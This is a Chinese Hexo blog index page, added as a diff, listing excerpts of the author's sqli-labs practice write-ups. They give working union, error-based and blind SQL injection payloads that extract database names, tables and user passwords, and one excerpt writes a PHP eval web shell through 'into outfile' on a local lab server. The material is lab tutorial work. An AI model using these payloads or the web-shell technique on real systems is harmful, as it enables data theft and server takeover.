@@ -1,0 +1,236 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta property="og:type" content="website">
+<meta property="og:title" content="懒大王的主场">
+<meta property="og:url" content="http://example.com/page/3/index.html">
+<meta property="og:site_name" content="懒大王的主场">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="Sanyer">
+<meta name="twitter:card" content="summary"><title>懒大王的主场</title><link ref="canonical" href="http://example.com/page/3/index.html"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">懒大王的主场</div><div class="header-banner-info__subtitle">懒大王专场，舔羊勿进</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/03/28/SQLI-DUMB-SERIES-9/">SQLI-DUMB-SERIES-9</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-03-28</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-03-31</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>首先?id&#x3D;1‘发现没有变化，我们加”,)各种组合都没反应。我们添加sleep函数进行检测。发现当我们输入?id&#x3D;1%27and%20sleep%20(5)%23时，发现网页在五秒之后才刷新成功。所以可以使用时间注入</p>
+<p><img src="https://tva4.sinaimg.cn/large/008gHraJly8h0rvlfrtn5j30pc02ajrj.jpg" alt="img"></p>
+<p><img src="C:\Users\88537\AppData\Roaming\Typora\typora-user-images\image-20220330150510247.png" alt="image-20220330150510247"></p>
+<p>后续不写了，和前面那个Less7用的方法一模一样的方式。截图实在太麻烦了，而且很没有营养。</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/03/28/SQLI-DUMB-SERIES-8/">SQLI-DUMB-SERIES-8</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-03-28</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-03-31</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>a</p>
+<p>经典开局?id&#x3D;1’发现网页异常，没有任何显示。我们加上%23之后显示正常。说明闭合为’但是没有网页报错显示。</p>
+<p>根据题目提示我们选择bool盲注</p>
+<p>?id&#x3D;1’ and length(database())&#x3D;8%23得出数据库名为8的长度</p>
+<p>我们继续打开burpsuite </p>
+<p><img src="https://tva3.sinaimg.cn/large/008gHraJly8h0rqk5avewj30od08g75k.jpg" alt="img"></p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h0rqjnirdjj313f0e640i.jpg" alt="img"></p>
+<p>跑出来第一个字母为s，接下来如法炮制得出数据库名为security</p>
+<p>改变下图获得users的列名，得出列名为id，username，password</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h0rrmjbns4j30xs08ata9.jpg" alt="img"></p>
+<p>根据下图我们可以得出第一个id&#x3D;1 username&#x3D;Dumb password&#x3D;Dumb</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/03/28/SQLI-DUMB-SERIES-7/">SQLI-DUMB-SERIES-7</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-03-28</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-04-02</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>a首先还是查找注入点，当我们输入1‘的时候，发现报错，但是当我们在后面添加%23时依然报错，说明这个地方还是没有闭合，按我们继续尝试加东西。</p>
+<p>我们在’后面加）一个不够再加一个，发现回显正常。</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h0qf9lmdx7j30nm0aq3zm.jpg" alt="img"></p>
+<p>?id&#x3D;-1’ union select 1,@@datadir,@@basedir%23在第一关中查出数据库的位置信息（没办法，第七关一点反应没有，小子无能查不出来）</p>
+<p><img src="https://tva4.sinaimg.cn/large/008gHraJly8h0qfo37i0cj30kr08bgmb.jpg" alt="img"></p>
+<p>然后通过</p>
+<p>先帝创业未办而中道崩殂，今日我文件导不出去而直接gg。好吧，我们只能选择时间盲注QAQ</p>
+<p>?id&#x3D;1%27))%20and%20if%20((length(database())%3E0),sleep(5),1)%23</p>
+<p>当我们输入这串代码时，我们放心网页在五秒后才停止转动小圆圈、说明我们的时间盲注可用</p>
+<p>?id&#x3D;1%27))%20and%20if%20((ascii(substr(database(),1,1))%3E150),sleep(5),1)%23我们先纯手工找一下database的第一个字母是什么，然后再利用burpsuite提升一下效率</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h0rnz109umj30k504ijrw.jpg" alt="img"></p>
+<p>发现当我们输入大于150时，没有延迟。所以第一个字母的ascii码小于150，我们逐步进行范围缩小最后确定最后发现其ascii码为115对应字母为s</p>
+<p><img src="https://tva3.sinaimg.cn/large/008gHraJly8h0ro3h13h4j30kr05n3z2.jpg" alt="img"></p>
+<p>然后我们开始抓包，抓到包后点击右键，Send to intruder。</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h0rnur2k8yj30vr0o1q8y.jpg" alt="img"></p>
+<p>在Intruder时，先点击Clear § 然后选中我们sql语句中的条件（现在是115），然后add。 之后更改我们要查的字母位置</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h0ropygqo5j30qd09t3zn.jpg" alt="img"></p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h0roqe9qtcj318j0jqtbi.jpg" alt="img"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h0ropa3f2nj30pj0ckmy7.jpg" alt="img"></p>
+<p>我们得出结果第二个字母是e</p>
+<p>跑出数据库名security</p>
+<p> if ((substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&#x3D;’e’,sleep(5),1)%23</p>
+<p>跑出第一个数据表的第一个字母为e</p>
+<p>用burpsuite查出表面是emails不是我们需要的表，更改limit 直到limit3，1的时候我们找到了users表</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h0rq0nyojmj31590b576c.jpg" alt="img"></p>
+<p>我们继续变化找出列名为id,username,password</p>
+<p>后续继续得出第一个id&#x3D;1 username&#x3D;Dumb password&#x3D;Dumb</p>
+<p>方法二：outfile </p>
+<p>由于靶场的数据库权限没开，只能自己搭了一个本地环境</p>
+<p>前面查注入点方法相同</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://localhost/sqli-labs/Less-1/?id=1&#39;" >http://localhost/sqli-labs/Less-1/?id=1&#39;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> union select 1,2,’<?php @eval($_POST["123"])?>‘ into outfile “D:&#x2F;&#x2F;phpstudy_pro&#x2F;&#x2F;WWW&#x2F;&#x2F;sqli-labs&#x2F;&#x2F;Less-1&#x2F;&#x2F;test1.php”%23</p>
+<p>在这里，为什么使用的是&#x2F;&#x2F;因为\会被过滤掉</p>
+<p><img src="https://tva3.sinaimg.cn/large/008gHraJly8h0vnk7j26bj31150cvdhx.jpg" alt="img"></p>
+<p>我们访问我们写的那个php网页，发现存在</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h0vnmct0g4j30om08ut97.jpg" alt="img"></p>
+<p>打开中国蚁剑，输入地址</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h0vnri34y3j30gj0d7dgj.jpg" alt="img"></p>
+<p>添加之后我们就可以为所欲为了</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/03/28/SQLI-DUMB-SERIES-6/">SQLI-DUMB-SERIES-6</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-03-28</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-03-31</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>?id&#x3D;1”找出注入点，闭合为”</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h0pzl6bm72j30y908m406.jpg" alt="img"></p>
+<p>?id&#x3D;1” and updatexml(0x3a,concat(0x3e,(select version())),1)%23得出数据库版本</p>
+<p><img src="https://tva3.sinaimg.cn/large/008gHraJly8h0pzqxqgsmj30mn0873zk.jpg" alt="img"></p>
+<p>?id&#x3D;1” and updatexml(0x3a,concat(0x3e,(select database())),1)%23得出数据库名字</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h0pzqggrssj30l5085q3z.jpg" alt="img"></p>
+<p>?id&#x3D;1” and updatexml(0x3a,concat(0x3e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1)),1)%23</p>
+<p>更改limit按顺序得出所有表名：emails，referers，uagents，users</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h0pzzx0j8jj30mh086t9t.jpg" alt="img"></p>
+<p>?id&#x3D;1” and updatexml(0x3a,concat(0x3e,(select column_name from information_schema.columns where table_name&#x3D;’users’ limit 1,1)),1)%23</p>
+<p>这是爆出第二列的列名，然后爆出所有列名：id、username、password</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h0pzz2mdcbj30lq08gmy7.jpg" alt="img"></p>
+<p>?id&#x3D;1” and updatexml(0x3a,concat(0x3e,(select username from users limit 3,1)),1)%23</p>
+<p>显示出第四个username</p>
+<p><img src="https://tva3.sinaimg.cn/large/008gHraJly8h0q04mg34ij30mp0980tq.jpg" alt="img"></p>
+<p>?id&#x3D;1” and updatexml(0x3a,concat(0x3e,(select password from users where username&#x3D;’secure’)),1)%23得出secure对应的密码</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h0q065nwiaj30ny0atdh1.jpg" alt="img"></p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/03/28/SQLI-DUMB-SERIES-5/">SQLI-DUMB-SERIES-5</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-03-28</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-03-31</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>这是第一个正经的报错注入..</p>
+<p>首先我们还是先找注入点，闭合方式是‘</p>
+<p><img src="https://tva3.sinaimg.cn/large/008gHraJly8h0pyddgf2wj30y509jq4l.jpg" alt="img"></p>
+<p>我们先利用报错注入找出数据库名</p>
+<p><img src="https://tva4.sinaimg.cn/large/008gHraJly8h0pyqyb785j30nt0ctjsw.jpg" alt="img"></p>
+<p>我们写入?id&#x3D;1’ and (updatexml(1,concat(1,(select table_name  from information_schema.tables where table_schema&#x3D;database() limit 0,1)),0x7e))%23</p>
+<p>得出数据表名，通过修改limit 0，1中的0，爆出所有表名</p>
+<p><img src="https://tva4.sinaimg.cn/large/008gHraJly8h0pyv6tubrj30kd08wt9q.jpg" alt="img"></p>
+<p>?id&#x3D;1’ and (updatexml(1,concat(1,(select column_name  from information_schema.columns where table_name&#x3D;’users’ limit 0,1)),0x7e))%23</p>
+<p>通过更改limit 0,1得出users表中的所有列名</p>
+<p><img src="C:\Users\88537\AppData\Roaming\Typora\typora-user-images\image-20220328224021093.png" alt="image-20220328224021093"></p>
+<p>我们得出，共有三列：id，username，password</p>
+<p>?id&#x3D;1’ and (updatexml(1,concat(1,(select username from users where id&#x3D;’1’)),0x7e))%23得出第一个username</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h0pzfq52r5j30jr09zab7.jpg" alt="img"></p>
+<p>?id&#x3D;1’ and (updatexml(1,concat(1,(select password from users where id&#x3D;’1’)),0x7e))%23得出与之对应的第一个password</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h0pzhjqmlpj30jg08faay.jpg" alt="img"></p>
+<p>慢慢更改id然后重复上面的步骤就行了，也可以不用id，通过limit控制输出</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/03/28/SQLI-DUMB-SERIES-4/">SQLI-DUMB-SERIES-4</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-03-28</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-03-31</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>首先先找注入点，在id&#x3D;1后加’无任何反应，我们尝试加”，报错。可得出闭合为”)</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h0px1who0oj30zu0hy41h.jpg" alt="img"></p>
+<p>接下来联合注入，简单快捷。具体内容参考SERIES1</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h0pxj52g8tj30ln0aq75c.jpg" alt="img"></p>
+<p>j经过操作发现有三列</p>
+<p>然后我们查出数据库名字和版本</p>
+<p><img src="https://tva4.sinaimg.cn/large/008gHraJly8h0pxl66hhgj30oq0c4myq.jpg" alt="img"></p>
+<p>爆出表名</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h0pxtgo804j30pz0amgn3.jpg" alt="img"></p>
+<p>爆出users的列名</p>
+<p><img src="https://s1.ax1x.com/2022/03/28/qsM4EQ.png" alt="image"></p>
+<p>爆出username</p>
+<p><img src="https://s1.ax1x.com/2022/03/28/qsMz59.png" alt="image"></p>
+<p>爆出password</p>
+<p><img src="https://s1.ax1x.com/2022/03/28/qsQFKK.png" alt="image"></p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/03/23/SQLI-DUMB-SERIES-3/">SQLI DUMB SERIES-3</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-03-23</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-03-24</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>好的，我们来到第三关</p>
+<p>由于那两个xpath报错注入的语法没啥太大区别，所以本题我们采用floor报错注入</p>
+<p>首先我们要深入了解一下floor注入的原理<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.freebuf.com/column/235496.html%E6%9B%B4%E6%96%B9%E4%BE%BF%E7%90%86%E8%A7%A3" >https://www.freebuf.com/column/235496.html更方便理解</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>首先还是id&#x3D;1，然后再输入id&#x3D;1‘</p>
+<p>我们发现这次的报错有不一样，他有好多的引号，然后还有括号</p>
+<p>我们这次把他拆的更细一些，near ’‘1’‘）LIMIT0，1’在这里near没用看这个’‘1’‘）LIMIT0，1’后面这个limit 0，1他也没用就是从零开始输出一个，然后就剩了</p>
+<p>‘1’’)从这个我们就可以分析出来他的格式了。很明显右边多一个’那么正确的格式就是**’id’)**所以我们通过’)进行闭合</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h0l6h5m8rtj310h0jewi0.jpg" alt="img"></p>
+<p>我们输入id&#x3D;1’) and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)%23查询出数据库的名称</p>
+<p><img src="https://tva4.sinaimg.cn/large/008gHraJly8h0l7tlinjij30tv0jctby.jpg" alt="img"></p>
+<p>然后查版本?id&#x3D;1’) and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h0l7z6qsmbj30y80isgoz.jpg" alt="img"></p>
+<p>接下来查表名就稍微有改变了，因为这个方法他每次只能显示出一组数据，所以我们需要加上 limit n，1</p>
+<p>?id&#x3D;1’) and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</p>
+<p><img src="https://tva4.sinaimg.cn/large/008gHraJly8h0l841b2ecj30ui082q47.jpg" alt="img"></p>
+<p>?id&#x3D;1’) and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h0l84wb8ihj30uc08bdh5.jpg" alt="img"></p>
+<p>?id&#x3D;1’) and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;database() limit 2,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h0l85vp97oj30wl092wga.jpg" alt="img"></p>
+<p>?id&#x3D;1’) and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</p>
+<p><img src="https://tva3.sinaimg.cn/large/008gHraJly8h0l86rudqyj30qq082gn6.jpg" alt="img"></p>
+<p>?id&#x3D;1’) and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;database() limit 4,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</p>
+<p>当我们到4的时候，他就没报错返回了，所以他只有4个表：emails、referers、uagents、users</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h0lawvz9ocj30uj0cugnu.jpg" alt="img"></p>
+<p>接下来又到了无聊的抽取一个幸运表报数据了</p>
+<p>这次选择referers表，首先需要爆出列名 id ip_address </p>
+<p>?id&#x3D;1’) and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name&#x3D;’referers’ limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</p>
+<p><img src="https://tva4.sinaimg.cn/large/008gHraJly8h0l9mbdrwij30op082dha.jpg" alt="img"></p>
+<p>?id&#x3D;1’) and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name&#x3D;’referers’ limit 2,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h0l9nmunj9j30po081q44.jpg" alt="img"></p>
+<p>最后只有三列：id、referer1、ip_address</p>
+<p>但好像很倒霉，这个表里面居然没数据</p>
+<p>换一个users表 经过和上面一样的爆表工作，我们发现也有三列：id,username,password</p>
+<p>我们输入?id&#x3D;1’) and (select 1 from (select count(*),concat((select concat(0x3c,id,0x3a,username,0x3a,password,0x3e) from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</p>
+<p><img src="https://tva4.sinaimg.cn/large/008gHraJly8h0lapb5gd0j30sr0chacc.jpg" alt="img"></p>
+<p>爆出了第一组数据，接下里只需要更改 limit 后的值就可以搞出所有的数据 </p>
+<p>😪经过吃饱了撑的遍历之后，他居然有12，14但是没用13？？？啊？？？ψ(._. )&gt;）</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/03/23/SQLI-DUMB-SERIES-2/">SQLI DUMB SERIES-2</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-03-23</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-03-24</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>id&#x3D;’and(select updatexml(“anything”,concat(‘~’,(select语句())),”anything”)) 第一个anything最好还是输入一些正常的东西吧，输入数字的话会被吞掉。当后面是数字的话，后面查询的内容也会被吞</p>
+<p>这是报错注入中updatexml函数的模板句 extractvalue语法与其用法几乎一模一样</p>
+<p>虽然本题具有回显的位置，但选择了报错注入的方法。</p>
+<p>首先也是输入i?d&#x3D;1进行判断发现页面发生变化，表示可注入（和上一个一样，所有就不截图了）</p>
+<p>接下来我们输入?id&#x3D;1’会发现报错 near ‘’，说明他的那个语句里什么都没有，就是单单的接受了我们注入的语句所以‘是有问题的</p>
+<p><img src="https://tva3.sinaimg.cn/large/008gHraJly8h0kwokv0v1j30un0j8415.jpg" alt="img"></p>
+<p> 那么它既然是直接接受不做任何处理，我们也就什么也不用加了，乐意的话加上#也行，没影响</p>
+<p> 既然我们选择了<strong>报错注入</strong>那么就没有必要去找什么列数了。</p>
+<p>直接输入?id&#x3D;1 and (updatexml(1,concat(1,(select database())),1))，直接就爆出了数据库名称</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h0ky9l2nphj30qd0hgmz7.jpg" alt="img"></p>
+<p>接下来输入?id&#x3D;1 and (updatexml(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())),1))</p>
+<p>爆出数据库里的表名</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h0kymvyl5zj30sy0i1dil.jpg" alt="img"></p>
+<p>接下来输入?id&#x3D;1 and (updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;’emails’)),1))</p>
+<p>爆出emails表中的列名</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h0kyv400zdj30uj0i6418.jpg" alt="img"></p>
+<p>接下来输入?id&#x3D;1 and (updatexml(1,concat(0x7e,(select group_concat(id,0x3a,email_id,0x7e) from emails )),1))爆出emails表中的内容，但由于位数限制我们只能爆出前两个</p>
+<p><img src="https://tva4.sinaimg.cn/large/008gHraJly8h0kz26pwrrj30t10i5jtv.jpg" alt="img"></p>
+<p>这时我们在后面添上查询条件where id not in(1)就可以不看id为1的数据，他就会显示2、3的数据了</p>
+<p>?id&#x3D;1 and (updatexml(1,concat(0x3e,(select group_concat(id,0x3a,email_id,0x7e) from emails where id not in(1) )),1))</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h0kz40jk2aj30tf0i4417.jpg" alt="img"></p>
+<p>老样子，接下来换一下表换一下搜索的东西就能爆出所有表的内容了</p>
+<p>≡(▔﹏▔)≡</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/03/23/sql%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">sql基础知识</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-03-23</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-03-24</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>#：</p>
+<p>由于编码的问题，所以替换成23% 或者–+或– 我是懒洋洋</p>
+<p><strong>常用函数：</strong></p>
+<p>User（）：返回当前使用函数库的用户</p>
+<p>Version（）：返回当前数据库版本</p>
+<p>Database（）：返回当前使用的函数库名</p>
+<p><strong>常用语句：</strong></p>
+<p>Information_schema:表示所有信息，包括库、表、列   这个暂时好像没啥用</p>
+<p>information_schema.tables: 记录所有表面信息的表   select group_concat(table_name) from information_schema.tables</p>
+<p>iiformation_schema.columns:记录所有列名信息的表</p>
+<p>table_schema:数据库的名称   where table_base&#x3D;’数据库名’</p>
+<p>table_name:表名</p>
+<p>column_name:列名</p>
+<p>group_concat()显示所有查询到的数据</p>
+<p>判断是否存在注入：</p>
+<p>1 and 1&#x3D;1 # （整型）</p>
+<p>admin:hellohack</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/03/23/SQLI-DUMB-SERIES-1-0/">SQLI DUMB SERIES-1</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-03-23</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-03-24</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>首先我们再url后面 添加?id&#x3D;1 ,发现页面变化且正常显示，说明我们输入的语句是可以被接受到的</p>
+<p><img src="https://tva4.sinaimg.cn/large/008gHraJly8h0jp6e96k4j30sj0jrwgo.jpg" alt="img"></p>
+<p>我们再次输入?id&#x3D;1’ 发现出现报错，说明‘是没有被过滤掉的。且这个属于一个用’的字符型注入。就可以理解成，他让你输入的位置是<strong>‘内容’</strong>这个样子的，所以输入1的时候是正确的，但如果多输入一个‘它后面就会多出来一个’所以报错了。 如果在后面再加#就可以注释掉系统后面的代码，就又正常了。</p>
+<p><img src="https://tva4.sinaimg.cn/large/008gHraJly8h0jptq1ih2j30t50fzwgi.jpg" alt="img"></p>
+<p>当我们输入?id&#x3D;1’ and 1&#x3D;2%23 时，会发现回显错误。就说明我们的1&#x3D;2是已经注入进去了，因为很明显不对所以没用回显。或者也可输入?id&#x3D;1’and ‘1’&#x3D;’2可得出相同的结果。</p>
+<p><img src="https://tva4.sinaimg.cn/large/008gHraJly8h0jpvle4p8j30ol0jk40d.jpg" alt="img">![img](h</p>
+<p>接下来我们开始利用order by来分析就是前面这个id的表里面有几列。因为，在联合查询的时候，两个表的列数必须一样不然会报错，</p>
+<p>如果当你后面表列数不足的话，可以随便填一个值补上那一列</p>
